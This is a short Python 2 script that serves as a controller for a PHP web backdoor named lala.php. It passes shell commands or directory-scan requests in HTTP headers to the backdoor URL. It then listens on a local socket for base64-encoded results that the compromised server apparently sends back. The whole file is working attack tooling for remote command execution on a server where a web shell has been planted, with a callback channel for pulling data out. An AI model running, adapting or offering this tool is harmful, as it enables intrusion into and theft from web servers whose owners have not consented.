import requests
import socket
import time
import threading 
import os
import base64
import argparse
from threading import Thread



ip = "localhost"
port = 1223
adresse_backdoor="http://localhost/lala.php"




parser = argparse.ArgumentParser()

actions_possibles=['shell','scandir']

parser.add_argument("--action", "-a", action="store", dest="action", help="What do you want to do today ?\r\nPossible actions : "+str(actions_possibles))
parser.add_argument("--param","-p",action="store",dest="param")

args = parser.parse_args()



def send_command(action,command):
	if(action=="shell"):
		head="CMD"
	if(action)=="scandir":
		head="SCANDIR"
	headers={head:command}
	r =requests.get(adresse_backdoor,headers=headers)
	print r

def listen():
	print "listening"
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.bind((ip,port))
	s.listen(1)
	conn, addr = s.accept()
	data=conn.recv(1024)
	print base64.b64decode(data)
	s.close()

Thread(target =send_command, args=(args.action,args.param,)).start()
Thread(target =listen).start()

